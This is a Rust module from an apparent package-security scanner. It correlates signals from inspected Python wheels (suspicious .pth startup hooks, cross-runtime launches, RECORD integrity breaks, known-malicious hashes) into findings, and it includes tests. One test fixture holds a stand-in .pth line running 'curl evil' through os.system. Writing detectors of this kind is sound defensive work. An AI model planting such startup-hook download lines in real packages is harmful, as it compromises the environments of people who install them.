//! Correlate an artifact inspection's granular signals and execution edges into
//! the user-facing findings (PR B8).
//!
//! The installed-tree path (`ecosystem scan --installed`) already correlates the
//! same `crate::artifact::ArtifactSignalKind`s into the same RuleIds via methods
//! on `crate::ecosystem_scan::InstalledIntegrityReport`. This module is the
//! ARTIFACT (wheel/sdist) counterpart: it correlates over an
//! [`crate::artifact::ArtifactInspection`]'s `signals` / `execution_edges`
//! (populated by [`crate::artifact::inspect`] from the A4 wheel reader plus the
//! B5/B6/B7 analyzers) and over an [`ArtifactSetInspection`] for cross-distribution
//! detection. It reuses the EXISTING RuleIds (cross-cutting invariant 1: few
//! user-facing findings, detail carried as signals), never inventing new ones for
//! the cross-artifact context.
//!
//! The conjunction shape mirrors the installed path deliberately, so a `.pth` that
//! is suspicious in a wheel and the same `.pth` once installed produce the same
//! finding:
//!
//! * [`crate::verdict::RuleId::PythonStartupHookSuspicious`] (High) needs an
//!   executing, non-template startup line paired with a danger capability.
//! * [`crate::verdict::RuleId::PythonStartupHookCrossRuntime`] (Critical) fires
//!   when a startup hook launches a foreign runtime (a cross-runtime execution
//!   edge).
//! * [`crate::verdict::RuleId::PythonInstalledIntegrityViolation`] (Medium, or
//!   High with corroboration) covers the RECORD / ownership signals.
//! * [`crate::verdict::RuleId::NativeImportExecutionChain`] (Critical) is produced
//!   per native member by B7 triage and folded in directly.
//! * [`crate::verdict::RuleId::ArtifactKnownMalicious`] (Critical) is the
//!   DB-gated, feature-gated hash match (see [`artifact_hash_indicator`]).

use std::collections::BTreeSet;

use crate::artifact::{
    ArtifactInspection, ArtifactSignal, ArtifactSignalKind, ExecutionEdge, ExecutionTrigger,
};
use crate::location::SubjectLocation;
use crate::threatdb::ThreatDb;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Correlate one artifact inspection's signals/edges into user-facing findings.
///
/// `extra_native_findings` are the per-member Critical
/// [`RuleId::NativeImportExecutionChain`] findings B7 triage produced while the
/// archive reader streamed native members (they are decided per member, not from
/// the inspection's signal set, so the inspection populator passes them through).
///
/// `threat_db` is threaded for the DB-gated [`RuleId::ArtifactKnownMalicious`]
/// hash match; it is consulted only behind the `artifact-hash-lookup` feature.
pub fn correlate_inspection_findings(
    inspection: &ArtifactInspection,
    extra_native_findings: &[Finding],
    threat_db: Option<&ThreatDb>,
) -> Vec<Finding> {
    let mut findings: Vec<Finding> = Vec::new();

    // Startup-hook correlation (B6) over the inspection's signals + edges.
    findings.extend(startup_findings(
        &inspection.signals,
        &inspection.execution_edges,
    ));

    // Installed-integrity-style correlation (B5): the RECORD / ownership signals
    // present on an artifact inspection (an unlisted/hash-mismatched member). For
    // a single wheel the corroborator is an unowned/unlisted EXECUTABLE member,
    // which `UnlistedInstalledFile` at High confidence already encodes.
    findings.extend(integrity_findings(&inspection.signals));

    // Native chains (B7): the per-member Critical findings, folded in as-is.
    findings.extend(extra_native_findings.iter().cloned());

    // DB-gated known-malicious hash match (B8 + DB-D), feature-gated.
    findings.extend(known_malicious_findings(inspection, threat_db));

    findings
}

/// The B6 startup-hook correlation over a signal slice plus the execution edges
/// (for the cross-runtime detail). Mirrors
/// `InstalledIntegrityReport::startup_correlated_findings` so a wheel and an
/// installed tree agree.
fn startup_findings(signals: &[ArtifactSignal], edges: &[ExecutionEdge]) -> Vec<Finding> {
    let startup_signals: Vec<&ArtifactSignal> = signals
        .iter()
        .filter(|s| is_startup_signal_kind(s.kind))
        .collect();
    if startup_signals.is_empty() {
        return Vec::new();
    }

    let mut findings: Vec<Finding> = Vec::new();
    let kinds: BTreeSet<ArtifactSignalKind> = startup_signals.iter().map(|s| s.kind).collect();
    use ArtifactSignalKind as K;

    let has_executing_line = kinds.contains(&K::PthExecutableLine);
    let has_danger = kinds.contains(&K::PthSubprocessSpawn)
        || kinds.contains(&K::PthNetworkDownload)
        || kinds.contains(&K::PthSysPathSearch)
        || kinds.contains(&K::StartupHookObfuscated)
        || kinds.contains(&K::PthUntrustedPathAddition);

    if has_executing_line && has_danger {
        let kind_list = distinct_kind_strings(startup_signals.iter().map(|s| s.kind));
        let mut evidence: Vec<Evidence> = vec![Evidence::Text {
            detail: format!("correlated startup-hook signals: {}", kind_list.join(", ")),
        }];
        // Name the offending member location(s) (B8f: a member-qualified
        // `foo.whl!/member`) plus the concrete offending lines.
        for loc in distinct_locations(startup_signals.iter().map(|s| &s.location)) {
            evidence.push(Evidence::Text {
                detail: format!("location: {loc}"),
            });
        }
        for s in &startup_signals {
            if matches!(s.kind, K::PthExecutableLine | K::PthUntrustedPathAddition) {
                evidence.push(Evidence::Text {
                    detail: s.evidence.clone(),
                });
            }
        }
        findings.push(Finding {
            rule_id: RuleId::PythonStartupHookSuspicious,
            severity: Severity::High,
            title: "A Python startup hook executes suspicious code at interpreter start"
                .to_string(),
            description: "An artifact bundles a startup hook (a .pth import line, a Python 3.15 \
                 .start entry-point file, or a sitecustomize.py/usercustomize.py) that executes \
                 suspicious code at every interpreter start once installed. The body pairs an \
                 executing, non-template line with a danger capability (a subprocess spawn, a \
                 network download, a sys.path search, obfuscated content, or an untrusted path \
                 addition). Canonical editable-install and namespace-package bootstraps are exempt \
                 because their complete line matches a known template. Do not install the artifact \
                 until the hook is reviewed."
                .to_string(),
            evidence,
            human_view: None,
            agent_view: None,
            mitre_id: Some("T1546".to_string()),
            custom_rule_id: None,
        });
    }

    // Cross-runtime: a startup-triggered cross-runtime execution edge.
    let cross_runtime_edges: Vec<&ExecutionEdge> = edges
        .iter()
        .filter(|e| {
            matches!(e.trigger, ExecutionTrigger::CrossRuntimeInvocation)
                && is_startup_trigger_origin(e)
        })
        .collect();
    if !cross_runtime_edges.is_empty() {
        let mut evidence: Vec<Evidence> = vec![Evidence::Text {
            detail: "a startup hook launches a different language runtime (Bun/Node/Deno) at \
                     interpreter start"
                .to_string(),
        }];
        for edge in &cross_runtime_edges {
            evidence.push(Evidence::Text {
                detail: format!("{} -> {} ({})", edge.from, edge.to, edge.mechanism),
            });
        }
        findings.push(Finding {
            rule_id: RuleId::PythonStartupHookCrossRuntime,
            severity: Severity::Critical,
            title: "A Python startup hook launches a different language runtime".to_string(),
            description: "An artifact bundles a Python startup hook that launches a separate \
                 language runtime (Bun, Node, or Deno) at interpreter start. This is the \
                 cross-distribution loader/payload split used by the live supply-chain campaign, \
                 where a Python .pth hands execution to a bundled JavaScript payload. The detection \
                 keys on the launched runtime name, not the payload filename, so renaming the \
                 script does not evade it. Treat this as an incident: do not install the artifact, \
                 and rotate any credentials reachable from the environment it targets."
                .to_string(),
            evidence,
            human_view: None,
            agent_view: None,
            mitre_id: Some("T1546".to_string()),
            custom_rule_id: None,
        });
    }

    findings
}

/// The B5 integrity correlation over a wheel inspection's signals: a RECORD hash
/// mismatch, a missing RECORD file, an unlisted member, or a duplicate-owned path.
/// Medium by default; High when corroborated by an unlisted EXECUTABLE member (the
/// `UnlistedInstalledFile` signal at High confidence, which the wheel-RECORD
/// verifier emits for an unlisted native module / script).
fn integrity_findings(signals: &[ArtifactSignal]) -> Vec<Finding> {
    use ArtifactSignalKind as K;
    let integrity_signals: Vec<&ArtifactSignal> = signals
        .iter()
        .filter(|s| is_integrity_signal_kind(s.kind))
        .collect();
    if integrity_signals.is_empty() {
        return Vec::new();
    }

    // Corroboration: a HIGH-confidence unlisted-file signal (an unlisted executable
    // member) or a hash mismatch elevates Medium to High.
    let corroborated = integrity_signals.iter().any(|s| {
        matches!(s.kind, K::UnlistedInstalledFile | K::RecordHashMismatch)
            && s.confidence == crate::artifact::EdgeConfidence::High
    });
    let severity = if corroborated {
        Severity::High
    } else {
        Severity::Medium
    };

    let kind_list = distinct_kind_strings(integrity_signals.iter().map(|s| s.kind));
    let mut evidence: Vec<Evidence> = vec![Evidence::Text {
        detail: format!(
            "correlated artifact integrity signals: {}",
            kind_list.join(", ")
        ),
    }];
    // Name each offending member location (B8f) plus the per-signal detail.
    for loc in distinct_locations(integrity_signals.iter().map(|s| &s.location)) {
        evidence.push(Evidence::Text {
            detail: format!("location: {loc}"),
        });
    }
    for s in &integrity_signals {
        evidence.push(Evidence::Text {
            detail: s.evidence.clone(),
        });
    }

    vec![Finding {
        rule_id: RuleId::PythonInstalledIntegrityViolation,
        severity,
        title: "An artifact's RECORD does not honestly account for its contents".to_string(),
        description: "The wheel's RECORD integrity does not hold: an unlisted member, a member \
             whose recorded hash does not match its bytes, or a path claimed by more than one \
             distribution. A freshly built wheel should account for every member with a strong \
             matching hash, so this is corroboration of tampering. It is Medium by default and \
             rises with a high-confidence corroborator such as an unlisted executable member; a \
             strict integrity policy can upgrade the action to Block via action_overrides."
            .to_string(),
        evidence,
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }]
}

/// The DB-gated, FEATURE-GATED known-malicious hash correlation. Emits a Critical
/// [`RuleId::ArtifactKnownMalicious`] when the artifact's whole-file hash or any
/// member's hash matches a known-malicious record. The lookup is compiled in only
/// under the `artifact-hash-lookup` feature (see [`artifact_hash_indicator`]); in
/// the default library build it is a no-op and the RuleId is unreachable.
fn known_malicious_findings(
    inspection: &ArtifactInspection,
    threat_db: Option<&ThreatDb>,
) -> Vec<Finding> {
    let Some(hit) = artifact_hash_indicator(inspection, threat_db) else {
        return Vec::new();
    };
    vec![Finding {
        rule_id: RuleId::ArtifactKnownMalicious,
        severity: Severity::Critical,
        title: "An inspected artifact or member matches a known-malicious hash".to_string(),
        description: "The threat database resolved this artifact's hash (or a bundled member's \
             hash) to a known-malicious record. This is a confirmed supply-chain artifact, not a \
             heuristic. Do not install or run it; remove it from caches and mirrors and rotate any \
             credentials that may have been exposed."
            .to_string(),
        evidence: vec![Evidence::Text { detail: hit }],
        human_view: None,
        agent_view: None,
        mitre_id: Some("T1195".to_string()),
        custom_rule_id: None,
    }]
}

/// The DB-gated known-malicious hash indicator for an inspection.
///
/// B8g cross-track seam, ACTIVATED in PR-I now that DB-D shipped the v2 hash
/// indices and their readers (`ThreatDb::check_artifact_sha256` /
/// `check_file_sha256`). Under the `artifact-hash-lookup` feature this decodes the
/// inspected artifact's whole-file SHA-256 (the `subject`'s lowercase-hex hash,
/// when the subject carries one) and each `inspection.files[].sha256`, queries the
/// DB, and returns the matching record's wire string for the evidence. The
/// whole-artifact hash is checked first (a positive there means the distributed
/// artifact itself is known-malicious); then each member's content hash (a bundled
/// known-malicious file). The first hit wins; an empty / v1 DB, an unparseable hex
/// string, or a subject without bytes (an installed distribution) simply yields no
/// match, so there is no false positive.
#[cfg(feature = "artifact-hash-lookup")]
fn artifact_hash_indicator(
    inspection: &ArtifactInspection,
    threat_db: Option<&ThreatDb>,
) -> Option<String> {
    let db = threat_db?;

    // 1) The whole-artifact hash, when the subject has exact bytes. An installed
    //    distribution carries no source-artifact hash (its installed bytes are not
    //    the artifact bytes), so it is skipped here; its members are still checked
    //    below by content hash.
    if let Some(artifact_sha) = subject_artifact_sha256(&inspection.subject) {
        if let Some(digest) = decode_sha256(artifact_sha) {
            if let Some(m) = db.check_artifact_sha256(&digest) {
                return Some(format!(
                    "the artifact's SHA-256 matches a known-malicious record \
                     (source: {}, confidence: {}{}{})",
                    m.source.as_str(),
                    m.confidence.as_str(),
                    if m.all_versions_malicious {
                        ", all versions malicious"
                    } else {
                        ""
                    },
                    campaign_suffix(m.campaign.as_deref()),
                ));
            }
        }
    }

    // 2) Each member's content hash against the file-hash index. The location names
    //    WHICH bundled member matched, so the evidence points at the file.
    for file in &inspection.files {
        let Some(digest) = decode_sha256(&file.sha256) else {
            continue;
        };
        if let Some(m) = db.check_file_sha256(&digest) {
            return Some(format!(
                "a bundled member's SHA-256 matches a known-malicious record \
                 (member: {}, source: {}, confidence: {}{})",
                file.location,
                m.source.as_str(),
                m.confidence.as_str(),
                campaign_suffix(m.campaign.as_deref()),
            ));
        }
    }

    None
}

/// The whole-artifact SHA-256 (lowercase hex) the subject carries, if any. Only a
/// subject with EXACT bytes has one: an [`InspectionSubject::Artifact`], a
/// [`InspectionSubject::GenericArchive`], or an [`InspectionSubject::InstalledFile`]
/// that was hashed. An [`InspectionSubject::InstalledDistribution`] has none (its
/// installed bytes are not the distributed-artifact bytes), so this returns `None`
/// and the artifact-hash lookup is skipped for it.
#[cfg(feature = "artifact-hash-lookup")]
fn subject_artifact_sha256(subject: &crate::artifact::InspectionSubject) -> Option<&str> {
    use crate::artifact::InspectionSubject as S;
    match subject {
        S::Artifact(a) => Some(a.sha256.as_str()),
        S::GenericArchive(g) => Some(g.sha256.as_str()),
        S::InstalledFile(f) => f.sha256.as_deref(),
        S::InstalledDistribution(_) => None,
    }
}

/// Decode a lowercase-hex SHA-256 string into the fixed `[u8; 32]` the v2 hash
/// indices take. Returns `None` for any string that is not exactly 32 decoded
/// bytes (a short / malformed / non-hex value), so a bad hash never panics and
/// never produces a false match.
#[cfg(feature = "artifact-hash-lookup")]
fn decode_sha256(hex_str: &str) -> Option<[u8; 32]> {
    hex::decode(hex_str).ok()?.try_into().ok()
}

/// Render the optional campaign label as an evidence suffix, or empty when absent.
#[cfg(feature = "artifact-hash-lookup")]
fn campaign_suffix(campaign: Option<&str>) -> String {
    match campaign {
        Some(c) => format!(", campaign: {c}"),
        None => String::new(),
    }
}

/// The DB-gated known-malicious hash indicator — DEFAULT build (feature off). The
/// lookup is compiled out entirely, so the artifact path never consults the DB for
/// a hash match and [`RuleId::ArtifactKnownMalicious`] is unreachable.
#[cfg(not(feature = "artifact-hash-lookup"))]
fn artifact_hash_indicator(
    _inspection: &ArtifactInspection,
    _threat_db: Option<&ThreatDb>,
) -> Option<String> {
    None
}

/// Whether a signal kind is a B6 startup-hook execution signal.
fn is_startup_signal_kind(kind: ArtifactSignalKind) -> bool {
    use ArtifactSignalKind as K;
    matches!(
        kind,
        K::PthExecutableLine
            | K::PthNetworkDownload
            | K::PthSubprocessSpawn
            | K::PthSysPathSearch
            | K::PthUntrustedPathAddition
            | K::StartupHookObfuscated
    )
}

/// Whether a signal kind is a B5 RECORD / ownership integrity signal.
fn is_integrity_signal_kind(kind: ArtifactSignalKind) -> bool {
    use ArtifactSignalKind as K;
    matches!(
        kind,
        K::RecordHashMismatch
            | K::RecordMissingFile
            | K::UnlistedInstalledFile
            | K::DuplicateOwnedFile
            | K::SitecustomizeUnowned
            | K::EditableInstallUnverified
    )
}

/// Whether a cross-runtime execution edge originates from a startup-hook trigger
/// (vs a native-module init), so the cross-runtime finding is attributed to the
/// startup path. A `default()`-targeted edge whose `from` is a `.pth`/`.start`/
/// sitecustomize member qualifies; we accept any edge whose `from` member looks
/// like a startup hook OR whose trigger is a startup trigger recorded on a
/// sibling signal. Conservative: an edge with no startup provenance is left to the
/// native correlation.
fn is_startup_trigger_origin(edge: &ExecutionEdge) -> bool {
    // The startup analyzer records cross-runtime edges with a startup-hook `from`
    // location (a `.pth`/`.start`/sitecustomize member). Match on the member path
    // suffix so a rename of the payload does not matter (we key on the LOADER kind).
    let from = edge
        .from
        .member_path
        .as_deref()
        .or_else(|| edge.from.installed_path.as_deref().and_then(|p| p.to_str()));
    match from {
        Some(p) => {
            let lower = p.to_ascii_lowercase();
            lower.ends_with(".pth")
                || lower.ends_with(".start")
                || lower.ends_with("sitecustomize.py")
                || lower.ends_with("usercustomize.py")
        }
        // No location to attribute: the startup analyzer emits cross-runtime edges
        // with the hook `from` set, so an edge with no `from` is not a startup one.
        None => false,
    }
}

/// The distinct signal-kind wire strings (snake_case), sorted, for evidence.
fn distinct_kind_strings(kinds: impl Iterator<Item = ArtifactSignalKind>) -> Vec<String> {
    let mut out: BTreeSet<String> = BTreeSet::new();
    for k in kinds {
        if let Ok(serde_json::Value::String(s)) = serde_json::to_value(k) {
            out.insert(s);
        }
    }
    out.into_iter().collect()
}

/// The distinct rendered signal locations (`foo.whl!/member`), in first-seen order
/// and deduplicated, so a correlated finding NAMES the offending member(s) (B8f)
/// without repeating one location per signal.
fn distinct_locations<'a>(locations: impl Iterator<Item = &'a SubjectLocation>) -> Vec<String> {
    let mut seen: BTreeSet<String> = BTreeSet::new();
    let mut out: Vec<String> = Vec::new();
    for loc in locations {
        let s = loc.to_string();
        if s != "<unknown>" && seen.insert(s.clone()) {
            out.push(s);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::artifact::{
        ArtifactIdentity, ArtifactInspection, EdgeConfidence, InspectionSubject,
    };
    use crate::location::SubjectLocation;
    use crate::threatdb::Ecosystem;

    fn wheel_inspection(filename: &str) -> ArtifactInspection {
        ArtifactInspection::new(InspectionSubject::Artifact(ArtifactIdentity {
            ecosystem: Ecosystem::PyPI,
            name: "demo".to_string(),
            version: Some("1.0".to_string()),
            filename: filename.to_string(),
            sha256: "a".repeat(64),
        }))
    }

    #[test]
    fn no_signals_yields_no_findings() {
        let inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
        let findings = correlate_inspection_findings(&inspection, &[], None);
        assert!(findings.is_empty());
    }

    #[test]
    fn executing_line_plus_danger_fires_suspicious() {
        let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
        let loc = SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/boot.pth");
        inspection.signals.push(ArtifactSignal {
            kind: ArtifactSignalKind::PthExecutableLine,
            location: loc.clone(),
            evidence: "import os; os.system('curl evil')".to_string(),
            confidence: EdgeConfidence::High,
        });
        inspection.signals.push(ArtifactSignal {
            kind: ArtifactSignalKind::PthSubprocessSpawn,
            location: loc,
            evidence: "os.system".to_string(),
            confidence: EdgeConfidence::High,
        });
        let findings = correlate_inspection_findings(&inspection, &[], None);
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::PythonStartupHookSuspicious
                && f.severity == Severity::High));
    }

    #[test]
    fn untrusted_path_alone_does_not_fire_suspicious() {
        // A non-executing path-add alone is not promoted to a Block.
        let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
        inspection.signals.push(ArtifactSignal {
            kind: ArtifactSignalKind::PthUntrustedPathAddition,
            location: SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/boot.pth"),
            evidence: "adds /tmp/x".to_string(),
            confidence: EdgeConfidence::Medium,
        });
        let findings = correlate_inspection_findings(&inspection, &[], None);
        assert!(findings.is_empty());
    }

    #[test]
    fn cross_runtime_startup_edge_fires_critical() {
        let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
        let from = SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/boot.pth");
        // A startup signal must be present (the correlation gates on the signal set
        // being non-empty), plus the cross-runtime edge.
        inspection.signals.push(ArtifactSignal {
            kind: ArtifactSignalKind::PthExecutableLine,
            location: from.clone(),
            evidence: "import demo._bootstrap".to_string(),
            confidence: EdgeConfidence::High,
        });
        inspection.execution_edges.push(ExecutionEdge {
            from,
            trigger: ExecutionTrigger::CrossRuntimeInvocation,
            to: SubjectLocation::default(),
            mechanism: "launches bun".to_string(),
            confidence: EdgeConfidence::High,
        });
        let findings = correlate_inspection_findings(&inspection, &[], None);
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::PythonStartupHookCrossRuntime
                && f.severity == Severity::Critical));
    }

    #[test]
    fn unlisted_executable_member_fires_integrity_high() {
        let mut inspection = wheel_inspection("demo-1.0-cp311-cp311-linux_x86_64.whl");
        inspection.signals.push(ArtifactSignal {
            kind: ArtifactSignalKind::UnlistedInstalledFile,
            location: SubjectLocation::member(
                "demo-1.0-cp311-cp311-linux_x86_64.whl",
                "demo/_speedups.abi3.so",
            ),
            evidence: "wheel member '_speedups.abi3.so' is not listed in RECORD".to_string(),
            confidence: EdgeConfidence::High,
        });
        let findings = correlate_inspection_findings(&inspection, &[], None);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PythonInstalledIntegrityViolation)
            .expect("integrity finding");
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn native_findings_are_folded_in() {
        let inspection = wheel_inspection("demo-1.0-cp311-cp311-linux_x86_64.whl");
        let native = Finding {
            rule_id: RuleId::NativeImportExecutionChain,
            severity: Severity::Critical,
            title: "native chain".to_string(),
            description: "x".to_string(),
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        };
        let findings =
            correlate_inspection_findings(&inspection, std::slice::from_ref(&native), None);
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::NativeImportExecutionChain));
    }

    #[test]
    fn known_malicious_not_emitted_without_db() {
        // With no DB threaded the seam cannot match: no ArtifactKnownMalicious
        // finding is produced even from a populated inspection. (In the default
        // library build the lookup is compiled out entirely, so this also holds
        // there; under the feature it holds because `threat_db` is `None`.)
        let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
        inspection.files.push(crate::artifact::ArtifactFile {
            location: SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/__init__.py"),
            size: 10,
            sha256: "b".repeat(64),
            kind: crate::artifact::ArtifactFileKind::PythonSource,
        });
        let findings = correlate_inspection_findings(&inspection, &[], None);
        assert!(findings
            .iter()
            .all(|f| f.rule_id != RuleId::ArtifactKnownMalicious));
    }

    // The activated hash-lookup seam: only compiled under the feature the firewall
    // flips on. A throwaway in-memory v2 DB carries a known artifact hash and a
    // known file hash; the seam must resolve an inspection's subject / member hash
    // to a Critical ArtifactKnownMalicious finding, and must NOT false-positive on
    // an unrelated hash or an empty / v1 DB.
    #[cfg(feature = "artifact-hash-lookup")]
    mod hash_lookup {
        use super::*;
        use crate::threatdb::Confidence;
        use crate::threatdb::{ThreatDb, ThreatDbFormat, ThreatDbWriter, ThreatSource};
        use ed25519_dalek::SigningKey;
        use rand_core::OsRng;

        /// A deterministic 32-byte digest from a seed (matches the threatdb test
        /// helper), plus its lowercase-hex form for an inspection's `sha256` field.
        fn sha(seed: u8) -> [u8; 32] {
            [seed; 32]
        }
        fn sha_hex(seed: u8) -> String {
            hex::encode(sha(seed))
        }

        /// Build a throwaway signed v2 DB with one malicious artifact hash
        /// (seed 0xAA) and one malicious file hash (seed 0xBB). The signing key is
        /// generated fresh and discarded; `from_bytes` does not verify against the
        /// embedded production key, so a self-signed DB loads for the read path.
        fn malicious_db() -> ThreatDb {
            let key = SigningKey::generate(&mut OsRng);
            let mut writer = ThreatDbWriter::new(1_700_000_000, 1);
            writer.add_artifact_sha256(
                sha(0xAA),
                ThreatSource::OssfMalicious,
                Confidence::Confirmed,
                true,
                Some("miasma"),
            );
            writer.add_file_sha256(
                sha(0xBB),
                ThreatSource::DatadogMalicious,
                Confidence::Confirmed,
                &[],
                None,
            );
            let bytes = writer
                .build_format(ThreatDbFormat::V2, &key)
                .expect("v2 build");
            ThreatDb::from_bytes(bytes, 0).expect("v2 load")
        }

        /// An EMPTY signed v2 DB (no hash records) — a present DB that knows nothing.
        fn empty_db() -> ThreatDb {
            let key = SigningKey::generate(&mut OsRng);
            let mut writer = ThreatDbWriter::new(1_700_000_000, 1);
            let bytes = writer
                .build_format(ThreatDbFormat::V2, &key)
                .expect("v2 build");
            ThreatDb::from_bytes(bytes, 0).expect("v2 load")
        }

        #[test]
        fn artifact_sha_match_fires_critical() {
            let db = malicious_db();
            // The wheel's whole-file hash equals the malicious artifact record.
            let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
            if let crate::artifact::InspectionSubject::Artifact(a) = &mut inspection.subject {
                a.sha256 = sha_hex(0xAA);
            }
            let findings = correlate_inspection_findings(&inspection, &[], Some(&db));
            let f = findings
                .iter()
                .find(|f| f.rule_id == RuleId::ArtifactKnownMalicious)
                .expect("artifact-hash match must fire ArtifactKnownMalicious");
            assert_eq!(f.severity, Severity::Critical);
        }

        #[test]
        fn member_sha_match_fires_critical() {
            let db = malicious_db();
            // A bundled member's content hash equals the malicious file record; the
            // whole-artifact hash is unrelated (NOT the 0xAA artifact record, which
            // `wheel_inspection`'s default "a"*64 == hex(0xAA*32) would otherwise be).
            let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
            if let crate::artifact::InspectionSubject::Artifact(a) = &mut inspection.subject {
                a.sha256 = sha_hex(0x33);
            }
            inspection.files.push(crate::artifact::ArtifactFile {
                location: SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/_payload.so"),
                size: 100,
                sha256: sha_hex(0xBB),
                kind: crate::artifact::ArtifactFileKind::NativeModule,
            });
            let findings = correlate_inspection_findings(&inspection, &[], Some(&db));
            let f = findings
                .iter()
                .find(|f| f.rule_id == RuleId::ArtifactKnownMalicious)
                .expect("member-hash match must fire ArtifactKnownMalicious");
            assert_eq!(f.severity, Severity::Critical);
            // The evidence names the offending member.
            let txt: String = f
                .evidence
                .iter()
                .map(|e| serde_json::to_string(e).unwrap_or_default())
                .collect();
            assert!(
                txt.contains("demo/_payload.so"),
                "evidence must name the matched member: {txt}"
            );
        }

        #[test]
        fn unrelated_hashes_do_not_match() {
            let db = malicious_db();
            // Neither the artifact hash nor any member hash is in the DB.
            let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
            if let crate::artifact::InspectionSubject::Artifact(a) = &mut inspection.subject {
                a.sha256 = sha_hex(0x11);
            }
            inspection.files.push(crate::artifact::ArtifactFile {
                location: SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/ok.py"),
                size: 10,
                sha256: sha_hex(0x22),
                kind: crate::artifact::ArtifactFileKind::PythonSource,
            });
            let findings = correlate_inspection_findings(&inspection, &[], Some(&db));
            assert!(findings
                .iter()
                .all(|f| f.rule_id != RuleId::ArtifactKnownMalicious));
        }

        #[test]
        fn empty_db_yields_no_false_positive() {
            // `check_file_sha256` (and the artifact index) are present but empty: no
            // match, no finding — the PR-I "absent/empty -> no false positive" gate.
            let db = empty_db();
            let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
            if let crate::artifact::InspectionSubject::Artifact(a) = &mut inspection.subject {
                a.sha256 = sha_hex(0xAA);
            }
            inspection.files.push(crate::artifact::ArtifactFile {
                location: SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/x.so"),
                size: 10,
                sha256: sha_hex(0xBB),
                kind: crate::artifact::ArtifactFileKind::NativeModule,
            });
            let findings = correlate_inspection_findings(&inspection, &[], Some(&db));
            assert!(findings
                .iter()
                .all(|f| f.rule_id != RuleId::ArtifactKnownMalicious));
        }

        #[test]
        fn malformed_hex_hash_is_skipped_not_panicked() {
            // A subject hash that is not valid 32-byte hex must be skipped (no panic,
            // no match), and a valid member hash still resolves.
            let db = malicious_db();
            let mut inspection = wheel_inspection("demo-1.0-py3-none-any.whl");
            if let crate::artifact::InspectionSubject::Artifact(a) = &mut inspection.subject {
                a.sha256 = "not-hex".to_string();
            }
            inspection.files.push(crate::artifact::ArtifactFile {
                location: SubjectLocation::member("demo-1.0-py3-none-any.whl", "demo/_p.so"),
                size: 10,
                sha256: sha_hex(0xBB),
                kind: crate::artifact::ArtifactFileKind::NativeModule,
            });
            let findings = correlate_inspection_findings(&inspection, &[], Some(&db));
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == RuleId::ArtifactKnownMalicious),
                "a bad subject hash must not abort the member lookup"
            );
        }
    }
}
